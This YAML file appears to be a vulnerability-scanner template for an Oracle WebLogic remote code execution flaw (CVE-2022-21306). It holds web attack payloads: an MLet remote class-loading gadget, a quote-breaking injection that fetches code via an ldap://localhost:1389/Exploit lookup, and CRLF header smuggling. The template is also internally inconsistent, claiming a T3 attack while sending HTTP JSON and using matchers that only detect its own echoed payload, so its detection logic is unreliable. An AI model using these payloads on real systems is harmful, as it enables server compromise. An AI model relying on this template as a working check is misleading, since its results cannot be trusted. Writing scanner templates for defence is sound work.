id: CVE-2022-21306

info:
  name: Oracle WebLogic Server Remote Code Execution Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: Easily exploitable vulnerability allows unauthenticated attacker with network access via T3 to compromise Oracle WebLogic Server.
  reference:
    - https://github.com/hktalent/CVE-2022-21306
  tags: rce, weblogic, cve2022-21306

http:
  - method: POST
    path:
      - "{{BaseURL}}"

    headers:
      User-Agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
      Content-Type: 'application/json'
      Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
      Referer: '{{BaseURL}}'
      Connection: 'keep-alive'
      X-Requested-With: 'XMLHttpRequest'

    body: |
      {
          "name": {
              "class": "javax.management.loading.MLet",
              "ctor": [
                  {
                      "type": "java.net.URL",
                      "val": "http://127.0.0.1:9999/"
                  }
              ],
              "version": "1.0"
          }
      }

    matchers:
      - type: word
        words:
          - "javax.management.loading.MLet"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}"

    headers:
      User-Agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
      Content-Type: 'application/x-www-form-urlencoded'
      Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
      Referer: '{{BaseURL}}'
      Connection: 'keep-alive'
      X-Requested-With: 'XMLHttpRequest\r
Content-Length: 5\r
\r
woohoo'

    body: |
      a';JdbcDataSource.getDataSource("ldap://localhost:1389/Exploit")//

    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "JdbcDataSource.getDataSource"
        part: body